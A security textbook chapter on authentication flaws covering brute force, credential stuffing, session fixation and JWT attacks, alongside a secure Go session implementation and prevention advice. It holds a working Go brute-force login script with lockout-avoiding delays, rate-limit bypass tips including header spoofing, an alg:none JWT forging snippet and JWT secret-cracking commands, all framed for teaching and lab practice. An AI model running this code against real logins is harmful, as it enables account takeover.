# Chapter 25: Authentication Flaws — Broken Auth, JWT Attacks, Session Management

*Authentication is the gateway to every application. When it fails, everything behind it is exposed. This chapter covers the real-world ways authentication breaks — from weak passwords to JWT algorithm confusion.*

---

## The OWASP A07: Identification and Authentication Failures

Authentication can fail in dozens of ways:
- Permits brute force or credential stuffing
- Weak passwords allowed
- Stores passwords in plaintext or weak hash
- Missing MFA on sensitive operations
- Exposes session tokens in URL
- Doesn't invalidate sessions on logout
- Session fixation attacks possible

---

## Credential Stuffing and Brute Force

### Brute Force

```go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
    "time"
    "bufio"
    "os"
)

func tryLogin(client *http.Client, loginURL, user, pass string) bool {
    form := url.Values{
        "username": {user},
        "password": {pass},
        "Login":    {"Login"},
    }
    
    resp, err := client.PostForm(loginURL, form)
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    
    // Success indicators (application-specific):
    // - Redirect to dashboard (302)
    // - Response body contains "Welcome" or "dashboard"
    // - Response does NOT contain "Invalid password"
    
    return resp.StatusCode == 302 || resp.StatusCode == 303
}

func bruteForce(loginURL, username, wordlistPath string) {
    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    
    f, _ := os.Open(wordlistPath)
    defer f.Close()
    
    scanner := bufio.NewScanner(f)
    attempts := 0
    
    for scanner.Scan() {
        password := strings.TrimSpace(scanner.Text())
        attempts++
        
        if tryLogin(client, loginURL, username, password) {
            fmt.Printf("[+] SUCCESS: %s:%s (after %d attempts)\n",
                username, password, attempts)
            return
        }
        
        // Rate limiting: don't get locked out
        if attempts % 10 == 0 {
            time.Sleep(500 * time.Millisecond)
        }
    }
    fmt.Printf("[-] Exhausted wordlist (%d passwords tried)\n", attempts)
}
```

### Credential Stuffing

```bash
# Use leaked credentials from data breaches
# Tools: Snipr, OpenBullet, custom scripts

# Check if email is in a breach (for defense)
# Have I Been Pwned API:
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com" \
    -H "hibp-api-key: YOUR_KEY"
```

### Rate Limiting Bypass Techniques

```
- IP rotation (different source IP per request)
- Slow speed (1 request/minute — below lockout threshold)
- Distributed attack (many IPs, each tries few passwords)
- X-Forwarded-For header manipulation
  POST /login
  X-Forwarded-For: 1.2.3.4  (spoof your IP each request)
```

---

## Session Fixation

```
1. Attacker gets a valid session ID: GET /login → Set-Cookie: session=abc123
2. Attacker tricks victim to use this session:
   https://site.com/login?session=abc123
3. Victim logs in (authenticates with attacker's session ID)
4. Site marks session abc123 as authenticated
5. Attacker uses session abc123 — now authenticated as victim!
```

**Prevention:** Always issue a new session ID upon successful authentication.

```go
// WRONG — reuse pre-auth session
func handleLogin(w http.ResponseWriter, r *http.Request) {
    sessionID := getSessionFromCookie(r)  // attacker controls this!
    // validate credentials...
    sessions[sessionID] = user  // attacker's session is now authenticated!
}

// CORRECT — new session on login
func handleLogin(w http.ResponseWriter, r *http.Request) {
    // validate credentials...
    newSessionID := generateSecureRandom()
    sessions[newSessionID] = user
    http.SetCookie(w, &http.Cookie{
        Name:     "session",
        Value:    newSessionID,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
    })
}
```

---

## JWT Attacks

### Algorithm Confusion (none attack)

```
Normal JWT:
header: {"alg": "HS256", "typ": "JWT"}
payload: {"user": "alice", "role": "user"}
signature: HMAC(header.payload, secret)

Attack: change to alg:none
header: {"alg": "none", "typ": "JWT"}
payload: {"user": "alice", "role": "admin"}  ← elevated!
signature: (empty)

If server accepts alg:none → attacker has admin without knowing secret!
```

### Algorithm Confusion (RS256 → HS256)

```
Server uses RS256 (asymmetric: private key signs, public key verifies)
Attacker knows the PUBLIC key (it's... public)

Attack: switch algorithm to HS256 (symmetric HMAC)
        use the PUBLIC KEY as the HMAC secret

Server verifies with HS256 using what it thinks is "the secret"
But it's actually verifying with the public key — which attacker knows!
```

### Weak Secret Brute Force

```bash
# jwt_tool
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# hashcat
echo "eyJ..." > jwt.txt
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# john
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

### JWT Testing Tools

```bash
# jwt_tool — comprehensive JWT testing
python3 jwt_tool.py -t https://site.com/api/profile \
    -rh "Authorization: Bearer TOKEN" \
    -M at  # all tests

# Manual with Python
import jwt
import base64, json

# Decode without verification (inspect claims)
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(payload)

# None algorithm attack
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "superuser"}
forged = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=') + b'.' + \
         base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=') + b'.'
```

---

## Go: Secure Authentication Implementation

```go
package main

import (
    "crypto/rand"
    "encoding/base64"
    "net/http"
    "sync"
    "time"
    
    "golang.org/x/crypto/bcrypt"
)

type Session struct {
    UserID    int
    Username  string
    CreatedAt time.Time
    ExpiresAt time.Time
}

type AuthService struct {
    mu       sync.RWMutex
    sessions map[string]*Session
}

func NewAuthService() *AuthService {
    svc := &AuthService{sessions: make(map[string]*Session)}
    go svc.cleanupExpired()
    return svc
}

func (a *AuthService) HashPassword(password string) (string, error) {
    hash, err := bcrypt.GenerateFromPassword([]byte(password), 12)
    return string(hash), err
}

func (a *AuthService) CheckPassword(password, hash string) bool {
    return bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) == nil
}

func (a *AuthService) CreateSession(userID int, username string) string {
    // Cryptographically random session ID
    b := make([]byte, 32)
    rand.Read(b)
    sessionID := base64.URLEncoding.EncodeToString(b)
    
    a.mu.Lock()
    a.sessions[sessionID] = &Session{
        UserID:    userID,
        Username:  username,
        CreatedAt: time.Now(),
        ExpiresAt: time.Now().Add(24 * time.Hour),
    }
    a.mu.Unlock()
    return sessionID
}

func (a *AuthService) ValidateSession(sessionID string) (*Session, bool) {
    a.mu.RLock()
    session, ok := a.sessions[sessionID]
    a.mu.RUnlock()
    
    if !ok || time.Now().After(session.ExpiresAt) {
        return nil, false
    }
    return session, true
}

func (a *AuthService) InvalidateSession(sessionID string) {
    a.mu.Lock()
    delete(a.sessions, sessionID)
    a.mu.Unlock()
}

func (a *AuthService) SetSessionCookie(w http.ResponseWriter, sessionID string) {
    http.SetCookie(w, &http.Cookie{
        Name:     "session",
        Value:    sessionID,
        HttpOnly: true,           // no JS access
        Secure:   true,           // HTTPS only
        SameSite: http.SameSiteStrictMode,  // CSRF protection
        MaxAge:   86400,          // 24 hours
        Path:     "/",
    })
}

func (a *AuthService) cleanupExpired() {
    ticker := time.NewTicker(1 * time.Hour)
    for range ticker.C {
        now := time.Now()
        a.mu.Lock()
        for id, session := range a.sessions {
            if now.After(session.ExpiresAt) {
                delete(a.sessions, id)
            }
        }
        a.mu.Unlock()
    }
}
```

---

## Summary

| Attack | Technique | Prevention |
|--------|-----------|-----------|
| Brute force | Try many passwords | Rate limiting, account lockout, MFA |
| Credential stuffing | Use leaked credentials | MFA, breach detection |
| Session fixation | Reuse pre-auth session | New session ID on login |
| JWT: alg none | Remove signature | Explicitly allow only expected algorithms |
| JWT: weak secret | Crack HMAC secret | Use 256-bit random secrets |
| JWT: RS→HS confusion | Use public key as HMAC | Explicitly specify algorithm |

---

## Exercises

1. Set up a DVWA brute force challenge. Write a Go program that successfully brute-forces it.
2. Create a JWT with `alg: none` using Python. Test it against a vulnerable JWT implementation.
3. Build a secure login handler in Go using bcrypt password hashing, secure session cookies, and rate limiting.
4. Use `jwt_tool` against a JWT from a real (test) application. Can you identify any weaknesses?
